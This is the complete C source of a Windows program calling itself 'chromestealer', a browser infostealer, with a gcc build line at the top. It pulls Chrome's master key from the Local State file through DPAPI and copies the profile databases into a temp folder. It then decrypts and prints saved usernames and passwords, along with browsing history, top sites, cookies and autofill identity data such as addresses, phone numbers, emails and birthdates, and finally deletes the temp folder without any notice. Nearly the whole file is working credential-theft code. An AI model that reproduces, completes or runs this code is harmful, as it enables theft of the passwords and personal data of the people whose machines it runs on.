//gcc .\chromestealer.c sqlite3.o -static -lShlwapi -lCrypt32 -lbcrypt -o chromestealer.exe
#include <windows.h>
#include <shlwapi.h>
#include <Shlobj.h>
#include <dpapi.h>
#include <stdio.h>
#include <string.h>
#include <bcrypt.h>
#include <ntdef.h>
#include "sqlite3.h"
//Google Chrome records Web storage data in a SQLite file in the user's profile. 
//The subfolder containing this file is 
//C:\Users\<User>\AppData\Local\Google\Chrome\User Data\Local State on Windows
#define BUFSIZE 1024
#define NUM_PATHS 9
BCRYPT_KEY_HANDLE hKey;
BCRYPT_AUTH_TAG_LENGTHS_STRUCT tagLens; 
BCRYPT_ALG_HANDLE hAlgorithm;

typedef struct SQLStatements{
  char* extensionCookies;
  char* history;
  char* topSites;
  char* loginData;
  char* webData;
} SQLStatements;

void setupSQL(SQLStatements* sql){
  sql->extensionCookies = "SELECT path, name, value FROM cookies";
  sql->history = "SELECT url FROM urls";
  sql->topSites = "SELECT url FROM top_sites";
  sql->loginData = "SELECT origin_url, username_value, password_value FROM logins";
  sql->webData = "SELECT A.guid, A.street_address, A.city, A.state, A.zipcode, A.country_code, full_name, number, email, day, month, year FROM autofill_profiles A  LEFT OUTER JOIN autofill_profile_names B ON A.guid = B.guid LEFT OUTER JOIN autofill_profile_phones C ON A.guid = C.guid LEFT OUTER JOIN autofill_profile_emails D ON A.guid = D.guid LEFT OUTER JOIN autofill_profile_birthdates E ON A.guid = E.guid LEFT OUTER JOIN autofill_profile_addresses F ON A.guid = F.guid";
}

PUCHAR AESGCMDecrypt(PUCHAR data, ULONG dataLen, PUCHAR iv, ULONG ivLen, PUCHAR tag){
  NTSTATUS ntstatus;
  BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth;
  BCRYPT_INIT_AUTH_MODE_INFO(auth);
  auth.pbNonce = iv;
  auth.cbNonce = ivLen;
  auth.pbAuthData = NULL;
  auth.cbAuthData = 0;
  auth.pbTag = tag;
  auth.cbTag = tagLens.dwMaxLength;
  auth.pbMacContext = NULL;
  auth.cbMacContext = 0;
  auth.cbAAD = 0;
  auth.cbData = 0;
  auth.dwFlags = 0;

  ULONG pcbResult = 0;
  ntstatus = BCryptDecrypt(
    hKey,
    data,
    dataLen,
    &auth,
    iv,
    ivLen,
    NULL,
    0,
    &pcbResult,
    0
  );
  if(!NT_SUCCESS(ntstatus)){
    printf("[!] Error calculating decryption length: %x\n", ntstatus);
    return NULL;
  }

  PBYTE pbOutput = malloc(sizeof(BYTE) * pcbResult); 
  
  ntstatus = BCryptDecrypt(
    hKey,
    data,
    dataLen,
    &auth,
    iv,
    ivLen,
    pbOutput,
    pcbResult,
    &pcbResult,
    0
  );
  if(!NT_SUCCESS(ntstatus)){
    printf("[!] Error decrypting data: %x\n", ntstatus);
    free(pbOutput);
    return NULL;
  }
  pbOutput[pcbResult] = '\0';
  return pbOutput;
}

int initDecrypt(BYTE* key, DWORD keySize){
  NTSTATUS ntstatus;
  ntstatus = BCryptOpenAlgorithmProvider(
    &hAlgorithm,
    BCRYPT_AES_ALGORITHM,
    NULL,
    0
  );
  if(!NT_SUCCESS(ntstatus)){
    printf("[!] Error getting aes algorithm %x\n", ntstatus);
    return -1;
  }

  ntstatus = BCryptSetProperty(
    hAlgorithm,
    BCRYPT_CHAINING_MODE,
    (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
    sizeof(BCRYPT_CHAIN_MODE_GCM),
    0
  );
  if(!NT_SUCCESS(ntstatus)){
    printf("[!] Error setting chaining mode %x\n", ntstatus);
    return -1;
  }

  ntstatus = BCryptGenerateSymmetricKey(
    hAlgorithm,
    &hKey,
    NULL,
    0,
    key,
    keySize,
    0
  );
  if(!NT_SUCCESS(ntstatus))
  {
    printf("[!] Failed to generate symmetric key %x\n", ntstatus);
    return -1;
  }

  DWORD cbResult = 0;
  ntstatus = BCryptGetProperty(
    hAlgorithm,
    BCRYPT_AUTH_TAG_LENGTH,
    (BYTE*)&tagLens,
    sizeof(tagLens),
    &cbResult,
    0
  );
  if(!NT_SUCCESS(ntstatus)){
    printf("[!] Error getting tag lengths %x\n", ntstatus);
    return -1;
  }

  return 1;
}

BYTE* getChromeKey(TCHAR* pszAppdata, DWORD* keyLen){
  //get to the right directory
  printf("[+] Finding chrome directory...\n");
  if(!SUCCEEDED(SHGetFolderPathA(
    NULL,
    CSIDL_LOCAL_APPDATA,
    NULL,
    0,
    pszAppdata
  ))){
    printf("[!] Error getting appdata path: %d\n", GetLastError());
    return NULL;
  }
  char* keyFilePath = "Google\\Chrome\\User Data\\Local State\0";
  TCHAR pszFile[MAX_PATH];
  if(!PathCombineA(
    pszFile, 
    pszAppdata, 
    keyFilePath)){
    printf("[!] Error combining path: %d\n", GetLastError());
    return NULL;
  }
  printf("[+] Chrome directory found. Getting local data...\n");
  HANDLE hFile = CreateFileA(
    pszFile,
    GENERIC_READ,
    0,
    NULL,
    3,
    FILE_ATTRIBUTE_NORMAL,
    NULL
  );
  DWORD fileSize = GetFileSize(
    hFile, 
    NULL
  );
  if(fileSize == INVALID_FILE_SIZE){
    printf("[!] Error getting file size: %d\n", GetLastError());
    return NULL;
  }
  char* fileBuffer = malloc(sizeof(char) * (fileSize + 1));
  DWORD bytesRead = 0;
  if(!ReadFile(
    hFile, 
    fileBuffer, 
    fileSize, 
    &bytesRead, 
    NULL)){
      printf("[!] Error reading file: %d\n", GetLastError());
      return NULL;
  }
  printf("[+] Local data found. Getting profile key...\n");
  //parse the encrypted key from the file
  char* found = (strstr(fileBuffer, "\"encrypted_key\"")) + 17;
  if(found == NULL){
    printf("[!] key not found... exiting...");
    return NULL;
  }
  DWORD end = 0;
  for(DWORD i = 0; i < 500; i++){
    if(*(found + i) == '}'){
      end = i - 1;
      break;
    }
  }
  if(end == 0){
    printf("[!] key end not found... exiting...");
    return NULL;
  }
  //copy key into buffer
  char* encryptedKey = malloc(sizeof(char) * (*(found) - end + 1));
  strncpy(encryptedKey, found, end);
  encryptedKey[strlen(encryptedKey)] = '\0';
  //decode key from base64
  DWORD pbSize = 0;
  CryptStringToBinaryA(
    encryptedKey,
    0,
    CRYPT_STRING_BASE64,
    NULL,
    &pbSize,
    NULL,
    NULL
  );
  BYTE* decodedKey = malloc(sizeof(BYTE) * pbSize);
  CryptStringToBinaryA(
    encryptedKey,
    0,
    CRYPT_STRING_BASE64,
    decodedKey,
    &pbSize,
    NULL,
    NULL
  );
  memset(decodedKey, 0, 5);
  printf("[+] Encrypted key found. Unencrypting...\n");
  //decrypt the key
  DATA_BLOB encData;
  DATA_BLOB entropy;
  DATA_BLOB decData;
  encData.cbData = pbSize - 5;
  encData.pbData = decodedKey + 5; //ignore first 5 bytes "DPAPI"
  entropy.cbData = 0;
  entropy.pbData = NULL;
  if(!CryptUnprotectData(
    &encData,
    NULL,
    &entropy,
    NULL,
    NULL,
    0,
    &decData
  )){
    printf("[!] Error unprotecting data: %d\n", GetLastError());
    return NULL;
  };
  free(fileBuffer);
  free(encryptedKey);
  CloseHandle(hFile);
  *keyLen = decData.cbData;
  return decData.pbData;
}

int main(int argc, char *argv[]){
  TCHAR pszAppdata[MAX_PATH];
  DWORD keyLen = 0;
  BYTE* decodedKey = getChromeKey(pszAppdata, &keyLen);
  if(!initDecrypt(decodedKey, keyLen)){
    printf("[!] Error during init of decryption key\n");
    return -1;
  }
  printf("[+] Sucessfully got encryption key for chrome information. Setting up temp directory..\n");
  //WE NOW HAVE THE KEY IN decData.pbData! now lets get our databases..
  //copy the files of the SQLite database into the temp directory
  TCHAR tempPath[MAX_PATH];
  if(!GetTempPathA(
    MAX_PATH,
    tempPath
  )){
    printf("[!] Error getting temp path directory: %d\n", GetLastError());
  };
  sprintf(tempPath + strlen(tempPath), "memes999\\");
  if(!CreateDirectoryA(
    tempPath,
    NULL
  )){
    DWORD err = GetLastError();
    if (err != 183 && err != 0){
      printf("[!] Error creating temp directory: %d\n", err);
      return -1;
    }
  };
  printf("[+] Done setting up temp directory. Copying database files...\n");
  char* databasePath = "Google\\Chrome\\User Data\\Default\\";
  TCHAR dataPath[MAX_PATH];
  if(!PathCombineA(
    dataPath,
    pszAppdata,
    databasePath
  )){
    printf("[!] Error combining paths: %d\n", GetLastError());
    return -1;
  }
  char* loot[NUM_PATHS] = {
    "Bookmarks", 
    "Extension Cookies",
    "History", 
    "Login Data", 
    "Preferences",
    "Secure Preferences", 
    "Top Sites",
    "Visited Links",
    "Web Data"
  };
  SQLStatements sql;
  setupSQL(&sql);
  sqlite3 *db;
  sqlite3_stmt *stmt;
  for(int i = 0; i < NUM_PATHS; i++){
    char* src = malloc(sizeof(char) * (strlen(dataPath) + strlen(loot[i]) + 1));
    if(!PathCombineA(
      src,
      dataPath,
      loot[i]
    )){
      printf("[!] Error combining path name %s with error %d", loot[i], GetLastError());
      return -1;
    }
    src[strlen(dataPath) + strlen(loot[i])] = '\0';
    char* dest = malloc(sizeof(char) * (strlen(tempPath) + strlen(loot[i]) + 1));
    if(!PathCombineA(
      dest,
      tempPath,
      loot[i]
    )){
      printf("[!] Error combining path name %s with error %d", tempPath, GetLastError());
      return -1;
    }
    dest[strlen(tempPath) + strlen(loot[i])] = '\0';
    //DEBUG: printf("[-] Copying from %s to %s\n", loot[i], dest);
    if(!CopyFileExA(
      src, 
      dest, 
      NULL,
      NULL,
      FALSE,
      COPY_FILE_FAIL_IF_EXISTS
    )){
      DWORD err = GetLastError();
      if(err != 80){
        printf("[!] Error copying file with name %s with error %d\n", loot[i], err);
        return -1;
      }
    };
    //DEBUG printf("[+] Finished copying database file. Querying data...\n");
    //send in the right query
    if(
      strcmp(loot[i], "Login Data") == 0 || 
      strcmp(loot[i], "History") == 0    ||
      strcmp(loot[i], "Top Sites") == 0  ||
      strcmp(loot[i], "Web Data") == 0   ||
      strcmp(loot[i], "Extension Cookies") == 0
    ){
      if(sqlite3_open(dest, &db) != SQLITE_OK){
        printf("[!] Error opening database: %s\n", sqlite3_errmsg(db));
        return -1;
      }
      //pick the right statement
      char* sqlreq;
      if(strcmp(loot[i], "Login Data") == 0){
        sqlreq = sql.loginData;
      }else if(strcmp(loot[i], "History") == 0){
        sqlreq = sql.history;
      }else if(strcmp(loot[i], "Top Sites") == 0){
        sqlreq = sql.topSites;
      }else if(strcmp(loot[i], "Web Data") == 0){
        sqlreq = sql.webData;
      }else{
        sqlreq = sql.extensionCookies;
      }
      if(sqlite3_prepare_v2(db, sqlreq, -1, &stmt, 0) != SQLITE_OK){
        printf("[!] Error preparing sql statement\n");
        return -1;
      }
      //TODO step through rows
      if(strcmp(loot[i], "Login Data") == 0){
        printf("LOGIN DATA\n");
        while(sqlite3_step(stmt) == SQLITE_ROW){
          const char* origin_url = sqlite3_column_text(stmt, 0);
          const char* username_value = sqlite3_column_text(stmt, 1);
          const char* encrypted_value = sqlite3_column_blob(stmt, 2);
          DWORD password_length = (DWORD)sqlite3_column_bytes(stmt, 2);
          //decrypt password
          BYTE* iv = malloc(sizeof(BYTE) * 12);
          BYTE* data = malloc(sizeof(BYTE) * (password_length - 31));
          BYTE* tag = malloc(sizeof(BYTE) * 16);
          memcpy(iv, encrypted_value + 3, 12);
          memcpy(data, encrypted_value + 15, password_length - 31);
          memcpy(tag, encrypted_value + (password_length - 16), 16);
          printf("%s: \n", origin_url);
          printf("username: %s\n", username_value);
          printf("password: %s\n", AESGCMDecrypt(data, password_length - 31, iv, 12, tag));
          free(iv);
          free(data);
          free(tag);
        }
      }else if(strcmp(loot[i], "History") == 0){
        printf("HISTORY:\n");
        while(sqlite3_step(stmt) == SQLITE_ROW){
          const char* url = sqlite3_column_text(stmt, 0);
          printf("%s\n", url);
        }
      }else if(strcmp(loot[i], "Top Sites") == 0){
        printf("TOP SITES\n");
        while(sqlite3_step(stmt) == SQLITE_ROW){
          const char* url = sqlite3_column_text(stmt, 0);
          printf("%s\n", url);
        }
      }else if(strcmp(loot[i], "Web Data") == 0){
        printf("WEB DATA:\n");
        while(sqlite3_step(stmt) == SQLITE_ROW){
          //A.guid, A.street_address, A.city, A.state, A.zipcode, A.country_code, 
          //full_name, number, email, day, month, year
          const char* guid = sqlite3_column_text(stmt, 0);
          const char* street = sqlite3_column_text(stmt, 1);
          const char* city = sqlite3_column_text(stmt, 2);
          const char* state = sqlite3_column_text(stmt, 3);
          const char* zip = sqlite3_column_text(stmt, 4); 
          const char* country = sqlite3_column_text(stmt, 5); 
          const char* fullname = sqlite3_column_text(stmt, 6); 
          const char* phone = sqlite3_column_text(stmt, 7); 
          const char* email = sqlite3_column_text(stmt, 8); 
          int day = sqlite3_column_int(stmt, 10); 
          int month = sqlite3_column_int(stmt, 11); 
          int year = sqlite3_column_int(stmt, 12); 
          printf("INFO FOR: %s\n", guid);
          printf("ADDR: %s, %s, %s, %s, %s\n", street, city, state, country, zip);
          printf("PERSON: %s, %s, %s\n", fullname, phone, email);
          printf("BIRTHDATE: %d, %d, %d\n", day, month, year); 
        }
      }else{
        printf("EXTENSION COOKIES\n");
        while(sqlite3_step(stmt) == SQLITE_ROW){
          const char* path = sqlite3_column_text(stmt, 0); 
          const char* name = sqlite3_column_text(stmt, 1); 
          const char* value = sqlite3_column_text(stmt, 2); 
          printf("%s, %s, %s\n", path, name, value);
        }
      }
      //cleanup
      if(sqlite3_finalize(stmt) != SQLITE_OK){
        printf("[!] Error finalizing statement\n");
        return -1;
      }
      if(sqlite3_close(db) != SQLITE_OK){
        printf("[!] Error closing DB: %s\n", sqlite3_errmsg(db));
        return -1;
      }
    }else{
      printf("%s:", loot[i]);
      //file isnt a sql database, just read it
      HANDLE hFile = NULL;
      hFile = CreateFileA(
        dest,
        GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
      );
      if(hFile == INVALID_HANDLE_VALUE){
        printf("[!] Error opening file, exiting....");
        return -1;
      }
      DWORD filesize = 0;
      DWORD bytesRead = 0;
      filesize = GetFileSize(hFile, NULL);
      BYTE* buffer = malloc(sizeof(BYTE) * (filesize + 1));
      if(!ReadFile(
        hFile,
        buffer,
        filesize,
        &bytesRead,
        NULL
      )){
        printf("[!] Error reading file, exiting");
        return 1;
      }
      printf("%s", buffer);
      free(buffer);
      CloseHandle(hFile);
    }
    free(dest);
    free(src);
  };
  //cleanup
  SHFILEOPSTRUCTA op;
  op.hwnd = NULL;
  op.wFunc = FO_DELETE;
  op.pFrom = tempPath;
  op.pTo = NULL;
  op.fFlags = FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT;
  op.fAnyOperationsAborted = FALSE;
  op.hNameMappings = NULL;
  op.lpszProgressTitle = NULL;
  SHFileOperationA(&op);
  BCryptDestroyKey(hKey);
  BCryptCloseAlgorithmProvider(hAlgorithm, 0);
  free(decodedKey);
  printf("chromestealer run done");
  return 0;
}